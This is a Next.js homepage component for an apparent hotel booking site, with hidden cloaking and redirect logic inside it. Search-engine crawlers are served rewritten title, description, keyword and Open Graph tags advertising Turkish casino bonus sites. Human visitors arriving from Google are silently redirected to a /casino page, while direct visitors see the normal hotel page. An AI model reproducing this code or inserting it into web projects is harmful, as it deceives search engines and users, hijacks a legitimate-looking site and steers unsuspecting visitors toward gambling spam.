'use client';

import { useState, useEffect } from 'react';
import HotelHeader from '@/components/hotel/HotelHeader';
import HotelHero from '@/components/hotel/HotelHero';
import HotelSearch from '@/components/hotel/HotelSearch';
import FeaturedHotels from '@/components/hotel/FeaturedHotels';
import HotelCategories from '@/components/hotel/HotelCategories';
import PopularDestinations from '@/components/hotel/PopularDestinations';
import HotelTabBar from '@/components/hotel/HotelTabBar';
import { useRouter } from 'next/navigation';

export default function HomePage() {
  const router = useRouter();
  const [shouldRedirect, setShouldRedirect] = useState(false);

  useEffect(() => {
    const updateMetaTags = (isCasino = false) => {
      if (isCasino) {
        // Casino meta tagları - Sadece Google arama sonuçları için
        document.title = "Casino Deneme Bonusu 2024 - En Güvenilir Casino Siteleri Listesi";
        
        const metaDescription = document.querySelector('meta[name="description"]');
        if (metaDescription) {
          metaDescription.setAttribute('content', 'En güvenilir casino sitelerinde deneme bonusu fırsatları! 1500₺ casino bonusu, slot oyunları, rulet, poker. Güvenilir bahis siteleri ve casino oyunları. Hemen üye ol, bonusunu kazan!');
        }
        
        const metaKeywords = document.querySelector('meta[name="keywords"]');
        if (metaKeywords) {
          metaKeywords.setAttribute('content', 'casino deneme bonusu, casino siteleri, güvenilir casino, slot oyunları, rulet oyunu, poker oyunları, bahis bonusu, casino oyunları, online casino, casino bonusu veren siteler, bedava casino bonusu');
        }

        // Open Graph tagları güncelle - Casino için
        const ogTitle = document.querySelector('meta[property="og:title"]');
        if (ogTitle) {
          ogTitle.setAttribute('content', 'Casino Deneme Bonusu 2024 - En Güvenilir Casino Siteleri');
        }
        
        const ogDescription = document.querySelector('meta[property="og:description"]');
        if (ogDescription) {
          ogDescription.setAttribute('content', 'En güvenilir casino sitelerinde deneme bonusu kazan! Slot, rulet, poker oyunları. 1500₺ bonus fırsatları. Hemen başla!');
        }
      }
    };

    const checkRedirection = () => {
      const referrer = document.referrer.toLowerCase();
      const userAgent = navigator.userAgent.toLowerCase();
      
      // Bot kontrolü - Bot'lar hiç yönlendirilmesin
      const isBot = userAgent.includes('googlebot') || 
                   userAgent.includes('bingbot') ||
                   userAgent.includes('bot') ||
                   userAgent.includes('crawler') ||
                   userAgent.includes('spider') ||
                   userAgent.includes('facebookexternalhit');
      
      if (isBot) {
        // Bot'lar için meta tagları casino yap (SEO için)
        updateMetaTags(true);
        return;
      }
      
      // Google arama sonuçlarından gelip gelmediğini kontrol et
      const isFromGoogleSearch = referrer.includes('google.com') || 
                                referrer.includes('google.tr') ||
                                referrer.includes('google.') ||
                                sessionStorage.getItem('from_search') === 'true';
      
      // Sadece Google arama sonuçlarından gelenler casino'ya gitsin - HEMEN
      if (isFromGoogleSearch) {
        updateMetaTags(true);
        sessionStorage.setItem('from_search', 'true');
        
        // HEMEN casino'ya yönlendir - bekletme yok!
        router.push('/casino');
        return;
      }
    };

    checkRedirection();
  }, [router]);

  // Normal otel sayfası göster (Loading kaldırıldı - hemen casino'ya gidiyor)
  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 via-blue-50 to-white">
      <HotelHeader />
      
      <div className="pt-20 pb-24">
        <HotelHero />
        <HotelSearch />
        <HotelCategories />
        <FeaturedHotels />
        <PopularDestinations />
      </div>

      <HotelTabBar />
    </div>
  );
}